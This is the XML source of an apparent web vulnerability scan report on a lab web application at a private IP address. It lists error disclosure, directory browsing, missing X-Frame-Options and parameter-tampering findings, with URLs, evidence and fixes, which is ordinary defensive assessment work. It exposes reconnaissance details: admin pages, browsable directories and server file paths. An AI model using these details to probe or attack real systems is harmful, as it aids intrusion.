      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="21FBE25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57DC81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570C32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31BEA5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726493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2D4A7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B5DC18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0F9C7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95ACC5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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2D4F815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6D734E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9159D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4D39AC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E21D1F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28148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8E3FEA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4E65D4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49526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http://192.168.1.20/validation/?C=S;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="163108D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DAD178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46C34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D67CE2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22BE39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8C6CB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4C5874D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25C2BE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50DC5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515422F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866A7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7AE35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44D688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3CF32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ECB9CD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5C4D5F0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8B0F8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82B32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http://192.168.1.20/images/pizza/?C=D;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="77F1549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F435A7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5F2A00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7D62E0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046825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C021B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5572E17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EAFAC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4838AD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http://192.168.1.20/stylesheets/?C=M;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="38D8E4E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340F1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D6CFA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2A320C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3D37FD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3DD0F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7B5DF4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72C47E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8CF67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http://192.168.1.20/images/?C=S;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="53FEBA6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744380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F275B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99337D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E423F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E7FD8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495B785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FD2027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6B503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http://192.168.1.20/images/?C=D;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="517BB28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5246F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1DD4A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D8EED3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17D84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763DF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09CDA8D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F2FDE2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URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A696E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http://192.168.1.20/admin/foods.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0894E20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1D3E4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8F98C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243EAD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2AF920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4815F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AC94E8B"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29652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BF4D6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http://192.168.1.20/admin/stylesheets/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="409975D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7D70E4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04C77B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8BBB6F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A4B2C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0F316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CE2F76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466C9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65097F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http://192.168.1.20/GTIGCCGDCCFM/?C=D;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6E3DC09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A3B3E3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DCE4B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F12B9D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21192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073032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891611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C70D3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F8050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http://192.168.1.20/GTIGCCGDCCFM/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1FAB38F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C474BE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638E4B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F96F22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6B5389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147EE8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5FF5833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CD3DFA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7374F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http://192.168.1.20/images/pizza/?C=S;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7681A7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8B6A3C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1B5CC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8DB8ED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70123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1AA2F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4CC3AF0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A04944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CB8E8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http://192.168.1.20/index.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="267476F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A1EB2D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6C033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9B4C1F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D0476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0F3119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110649F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682394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CDC787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http://192.168.1.20/GTIGCCGDCCFM/?C=D;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7F48E6D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9516A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362C5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3B79EC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CD61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42D2A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19686D9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652BB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EF649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http://192.168.1.20/images/?C=S;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3857F3D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64206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DF342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3B3A60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1317E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02C467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7633997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DF5887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F80AB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http://192.168.1.20/swf/?C=N;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2B87CEE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492517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C4B9B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F19C5F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419994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51A5AC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3C66DB4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ACD1CC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9D5DC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http://192.168.1.20/admin/specials.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5FCB2FA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0F7DBE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FBB4E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85C863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0EF9B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331CB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X-Frame-Options</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0A1F4B1B"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0950F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0178960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128</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="50AAE49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D90FA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6DF0F9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the web page in supported web browsers).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="07D6B75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7104F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Reference</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="57CA52C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https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3506AAA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343978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6318447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16</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6FEF37F1"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BCE59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164BAB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15</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="73EED89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74207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4B1EB4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2CF953E8"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76D94ECE" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFA500"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7414C6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Medium (Medium)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFA500"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5C1A45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Application Error Disclosure</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="283AB664"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9B131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6DCB38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tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="48F02667" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6F73CF99" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="220E3A8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FFE272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430753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3A375D4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6E7AA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09333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5157621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020E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EF0A78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&lt;b&gt;Warning&lt;/b&gt;: include(sqlcm.php): failed to open stream: No such file or directory in &lt;b&gt;/opt/lampp/htdocs/studentsite/login-exec.php&lt;/b&gt; on line &lt;b&gt;55&lt;/b&gt;&lt;br /&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="18DA4D2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05A34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FA4303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http://192.168.1.20/swf/?C=N;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="403AA3F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9CE9A3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5FF5A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B2732D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4AFF53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D5F46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59B6EDF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9D538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3F283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http://192.168.1.20/admin/stylesheets/?C=N;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="47DF699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9D41A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8FC73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EA496B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0E1EC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644F62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5F84684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B3745D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2804FD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http://192.168.1.20/stylesheets/?C=S;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="66EE1E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5A1AFA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6DC92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97084C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81256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28F2A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73192B63"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CA366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3B2F2C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http://192.168.1.20/admin/validation/?C=N;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4ACE8DE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7A266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C3F7DE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19833F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12739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8CD288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35A8402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70F10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8057D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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1321221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B1849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F39453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1F8E58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251D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FED69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465B26D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48A48C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817DB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http://192.168.1.20/stylesheets/?C=S;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="34B5396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1EF14A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BF803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D4AC69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7686EB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C6C99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659EE7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8B1036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9DBF5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http://192.168.1.20/stylesheets/?C=M;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4167404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1DC4E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818FB2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F382DB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11A10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00371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AF5962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93E40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44A21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http://192.168.1.20/admin/validation/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="355A1AE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8D588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B8982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4C437E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C6B4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Evidence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E06C51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6507E2F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6A29C3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7500CC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http://192.168.1.20/admin/validation/?C=N;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3B7014B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A9C384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62744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825972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5D6C5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B51B1F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5173F62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524195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4EC1F2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http://192.168.1.20/GTIGCCGDCCFM/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3EF947A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8B63D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26099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F78D7D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C3FC1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4FD2B7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4F971F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9FCE64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61B6B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http://192.168.1.20/images/?C=S;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="578BD44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096BD1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1E2094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792359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5B3A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8D5A7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7395246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F1DBE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333C1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http://192.168.1.20/validation/?C=D;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4BB55DA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BA33A2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FFA98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081819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7D730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55C49A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695BBE5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354C74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66EF28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http://192.168.1.20/admin/validation/?C=M;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="12FF3C1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FA14B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9D45C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05156F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4B0CEF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E01A62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78CABBB3"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B81AE7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90F3E0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http://192.168.1.20/admin/stylesheets/?C=M;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2AAE2B6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48FAE3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71BA5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588519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6C3789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3F6FE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6AFAC74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9AF86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DD1F6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http://192.168.1.20/images/?C=D;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="68BC95C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1BAC45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50AC1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A90916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5CAC0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E3DF9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16E4B7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725EA7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4A0A1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http://192.168.1.20/images/?C=D;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2878547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F51E63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3F927C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755227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B4E0C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C4893A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3DED6D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81917D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5B535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http://192.168.1.20/images/pizza/?C=S;O=D</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="62261A8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6E5B5C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57A5B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185C23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AD5393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100A9F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041571F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379D05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33A71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http://192.168.1.20/admin/stylesheets/?C=M;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="27E62FB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5C1F2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C8726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685901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4C0B65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02069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6CDD6C6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CF4A1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FD86D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http://192.168.1.20/swf/?C=M;O=A</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4D447E7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594D15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92EA38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948BFE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7B437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7C12F8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4146B99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6F60E4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688E97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86</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0047B6E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14A18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Solution</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="228917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Review the source code of this page. Implement custom error pages. Consider implementing a mechanism to provide a unique error reference/identifier to the client (browser) while logging the details on the server side and not exposing them to the user.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2D02688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A419FA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22979A2D" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0FE6C38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0717F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2D28C3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200</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4CE4819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2E6B3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0775CA7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13</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="09F6ACC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54C08D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00FD216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57502C82"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72383307" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFA500"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="39C85C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Medium (Medium)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFA500"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5682C7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Directory Browsing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1C2735F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10A83C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3B6E93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It is possible to view the directory listing. Directory listing may reveal hidden scripts, include files, backup source files, etc. which can be accessed to read sensitive information.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5BD49F55" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="274D4ECC" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="246B1FA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6F154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34B22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http://192.168.1.20/stylesheets/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2588756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CAABEC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D64F7E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7423C6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F0CA1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22969E4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317CF93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313B02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55AA51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http://192.168.1.20/GTIGCCGDCCFM/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="788D8A5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270945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3F852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006E5A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9002B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468B10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35F6EAE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3A5689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BA9A3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http://192.168.1.20/admin/stylesheets/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6CD6BD8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9E2E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B775A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1E3CB2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531E1A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65A97B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0C01619B"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AF5F1B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8478D3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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="71340D1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C0A3C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FD2B3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0E38F4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4E83A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0C248A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158B4D0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4FD35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0ED957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http://192.168.1.20/icons/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4AEC695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C1696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994C2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C1E2BD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A91030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582DB24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3A8A81D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C85626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41BD36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http://192.168.1.20/admin/validation/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="652D36D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EA40A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62E9C4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B498AC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9EA0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6A81A95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09B2C4A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F5EB66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F88AF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http://192.168.1.20/swf/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3E02F47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2E06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2C942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AB6CD1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68A8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541091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0C23B7E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1E63D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8C0EB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http://192.168.1.20/css/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="2848AB7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151C5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90036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2AAB25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6E7E8D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09DCB22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362E0C5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989AF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212CC2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http://192.168.1.20/pictures/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0C18F57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F9B62B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72687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848772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48E93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Attack</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5CBC8BB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46C62B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F10935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9F198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http://192.168.1.20/js/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="41500C3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D13EE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0BC428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39F9A1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6F204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7D9837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1070072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CE645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902833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http://192.168.1.20/validation/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4AE58FE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4CE61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C7B227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D1DB4D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CEBA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0CD4DC8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14BD571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7B0392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E8CA5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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="3A7CB15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EC1B98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8F7838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75880F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AB7F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3A3D28F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Parent Directory</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="231C6CF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9584E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4BC016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12</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="19391CA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48CF5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7EBFA5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Disable directory browsing. If this is required, make sure the listed files does not induce risks.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="1D911DE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F0D5A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7E5EA1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http://httpd.apache.org/docs/mod/core.html#options</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F752EC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http://alamo.satlug.org/pipermail/satlug/2002-February/000053.html</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="79B8D26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334FF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034B459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548</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="4EE5B8E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26C5D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523ED1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48</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="335A54F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DF475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065CDB6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bl>
    <w:p w14:paraId="2B795674"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21685097" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFA500"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="68F65C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Medium (Low)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4000" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFA500"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4E5156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 Tampering</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:bookmarkEnd w:id="77"/>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="62EF48DD"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9E886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2879C7B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 manipulation caused an error page or Java stack trace to be displayed. This indicated lack of exception handling and potential areas for further exploit.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5C6B33FC" w14:textId="77777777" w:rsidTr="00DA102C">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="2"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="10CB2586" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0152FB6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7B62E2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3146A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http://192.168.1.20/update-quantity.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="35EC5DF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78303E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839367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17ECF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7DD66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3A6CF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item</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="05FBED1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E86E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7DB5F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77EEE12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CC2D3E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9485B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w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6803789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23FCC6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491CA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DB1E64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835888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68C376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id</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="73880C5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CDAF32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6AFDB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2890530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54D5E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43B0D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http://192.168.1.20/admin/login-exec.php</w:t>
            </w:r>
          </w:p>
